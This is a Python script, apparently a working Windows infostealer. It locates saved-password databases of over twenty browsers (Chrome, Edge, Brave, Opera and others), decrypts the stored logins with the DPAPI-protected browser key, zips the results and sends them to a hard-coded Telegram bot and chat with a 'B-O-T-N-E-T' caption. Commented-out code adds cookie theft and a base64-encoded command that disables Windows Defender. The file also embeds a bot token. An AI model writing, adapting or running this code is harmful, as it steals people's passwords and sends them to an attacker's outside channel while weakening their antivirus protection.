import os
import subprocess
import sys
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Kiểm tra và cài đặt thư viện nếu cần
libraries = ['shutil', 'sqlite3', 'telebot', 'pywin32', 'pycryptodome', 'pypiwin32']

for lib in libraries:
    try:
        __import__(lib)
    except ImportError:
        print(f"Bắt đầu tải các thư viện cần thiết...")
        install(lib)
        
import shutil
import sqlite3
import json
import base64
import telebot
import asyncio
import win32crypt
from Cryptodome.Cipher import AES



ID = '-1002061706055'
TOKEN = '6055727531:AAEKXKTUn2xK3mdi02_mGWrcTrBL5ydrghU'

passwd = 0
cookies = 0
path_data = 'C:\\Users\\Public\\Document'
try:os.mkdir(path_data)
except:pass
try:os.mkdir(path_data+'\\Password')
except:pass
# def disable_defender():
#     cmd = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode()
#     subprocess.run(cmd, shell=True, capture_output=True)
def find_profile(data_path):
    profile=[]    
    profile.append('Default')
    try:
        objects = os.listdir(data_path)
        files_dir = [f for f in objects if os.path.isdir(os.path.join(data_path, f))]
        for folder in files_dir:
            text = folder.split()
            if(text[0] == 'Profile'):
                profile.append(folder)
        return profile
    except:pass


def browser():
    a = [
        {
            'name': 'Google',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"))
        },
        {
            'name': 'CocCoc',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CocCoc", "Browser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CocCoc", "Browser", "User Data"))
        },
        {
            'name': 'Edge',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"))
        },
        {
            'name': 'Brave',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"))
        },
        {
            'name': 'Chromium',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Chromium", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Chromium", "User Data"))
        },
        {
            'name': 'Amigo',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Amigo", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Amigo", "User Data"))
        },
        {
            'name': 'Torch',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Torch", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Torch", "User Data"))
        },
        {
            'name': 'Kometa',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Kometa", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Kometa", "User Data"))
        },
        {
            'name': 'Orbitum',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Orbitum", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Orbitum", "User Data"))
        },
        {
            'name': 'CentBrowser',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CentBrowser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CentBrowser", "User Data"))
        },
        {
            'name': '7Star',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "7Star", "7Star", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "7Star", "7Star", "User Data"))
        },
        {
            'name': 'Sputnik',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Sputnik", "Sputnik", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Sputnik", "Sputnik", "User Data"))
        },
        {
            'name': 'Vivaldi',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data"))
        },
        {
            'name': 'GoogleChromeSxS',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome SxS", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome SxS", "User Data"))
        },
        {
            'name': 'EpicPrivacyBrowser',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Epic Privacy Browser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Epic Privacy Browser", "User Data"))
        },
        {
            'name': 'MicrosoftEdge',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"))
        },
        {
            'name': 'Uran',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "uCozMedia", "Uran", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "uCozMedia", "Uran", "User Data"))
        },
        {
            'name': 'Yandex',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Yandex", "YandexBrowser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Yandex", "YandexBrowser", "User Data"))
        },
        {
            'name': 'Brave',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"))
        },
        {
            'name': 'Iridium',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Iridium", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Iridium", "User Data"))
        },
        {
            'name': 'Opera',
            'path': os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable"),
            'profile': find_profile(os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable"))
        },
        {
            'name': 'OperaGX',
            'path': os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable"),
            'profile': find_profile(os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable"))
        },
    ]

    return a
def getSecretKey(path1):
    try:
        path = os.path.normpath(path1 + "\\Local State")
        with open(path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except:
        pass
#Decrypt
def decryptPayload(cipher, payload):
    return cipher.decrypt(payload)
def generateCipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
def decryptPassword(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generateCipher(secret_key, initialisation_vector)
        decrypted_pass = decryptPayload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except:
        pass
# def start1():
#     bc = browser()
#     cookie = []
#     for bs in bc:
#         if os.path.exists(bs['path']):
#             for profile in bs['profile']:
#                 try:
#                     if os.path.exists(os.path.join(bs['path'], profile, 'Network', 'Cookies')):
#                         shutil.copyfile(os.path.join(bs['path'], profile, 'Network', 'Cookies'), os.path.join(path_data,'Cookie '+bs['name']+' '+profile ))
#                         cookie.append({'path':os.path.join(path_data,'Cookie '+bs['name']+' '+profile ),'pathkey':bs['path'],'name':bs['name'],'profile':profile})
#                 except:pass
#         else:
#             pass
#     return cookie
def start2():
    bc = browser()
    password = []
    for bs in bc:
        if os.path.exists(bs['path']):
            for profile in bs['profile']:
                try:
                    if os.path.exists(os.path.join(bs['path'], profile, 'Login Data')):
                        shutil.copyfile(os.path.join(bs['path'], profile, 'Login Data'), os.path.join(path_data,'Login '+bs['name']+' '+profile ))
                        password.append({'path':os.path.join(path_data,'Login '+bs['name']+' '+profile),'pathkey':bs['path'],'name':bs['name'],'profile':profile})
                except:pass            
        else:
            pass
    return password
def extract():
    global passwd
    #screenshot()
    #grab_files()
    # datacookie = start1()
    # for row in datacookie:            
    #     c = sqlite3.connect(row['path'])
    #     cursor = c.cursor()
    #     select_statement = 'SELECT host_key, name, value, encrypted_value,is_httponly,is_secure,expires_utc FROM cookies'
    #     cursor.execute(select_statement)
    #     bc = cursor.fetchall()
    #     data1 = []
    #     for user in bc:
    #         if user[4] == 1 : httponly = "TRUE"
    #         else:httponly = "FALSE"
    #         if user[5] == 1 : secure = "TRUE"
    #         else:secure = "FALSE"
    #         value = decryptPassword(user[3], getSecretKey(row['pathkey']))
    #         cookie = f"{user[0]}\t{httponly}\t{'/'}\t{secure}\t\t{user[1]}\t{value}\n"    
    #         data1.append(cookie)
    #         cookies +=1
    #     with open(os.path.join(path_data,'Cookie',row['name']+' '+row['profile']+'.txt'), "w",encoding='utf-8') as f:
    #         for line in data1:
    #             f.write(line)
    
    datapassword = start2()
    for row in datapassword:
        c = sqlite3.connect(row['path'])
        cursor = c.cursor()
        select_statement = 'SELECT action_url, username_value, password_value FROM logins'
        cursor.execute(select_statement)
        login_data = cursor.fetchall()
        data2 = []
        for userdatacombo in login_data:
            if userdatacombo[1] != None and userdatacombo[2] != None and userdatacombo[1] != ""  and userdatacombo[2] != "" and userdatacombo[0] != "":
                password = decryptPassword(userdatacombo[2], getSecretKey(row['pathkey']))
                data = "**************************************************\nURL: " + userdatacombo[0] + " \nUsername: " + userdatacombo[1] + " \nPassword: " + str(password)
                data2.append(data)
                passwd +=1
            else:
                pass
        with open(os.path.join(path_data,'Password',row['name']+' '+row['profile']+'.txt'), "w",encoding='utf-8') as f:
            for line in data2:
                f.write(line + "\n")

async def send_file_to_telegram(token, chat_id, file_path, caption):
    try:
        bot = telebot.TeleBot(token)
        with open(file_path, 'rb') as file:
            bot.send_document(chat_id, file, caption=caption)
    except Exception as e:
        print(f"Failed to send file to Telegram: {e}")

def main():
    extract()
    name_f = f'Data'
    z_ph = os.path.join(os.environ["TEMP"], name_f +'.zip');shutil.make_archive(z_ph[:-4], 'zip', path_data)
    caption = f"==== @B-O-T-N-E-T ====\n🗝 Passwords => {passwd}\n🍪 Cookies => {cookies}"
    asyncio.run(send_file_to_telegram(TOKEN, ID, z_ph, caption))
if __name__ == '__main__':
    main()

    
    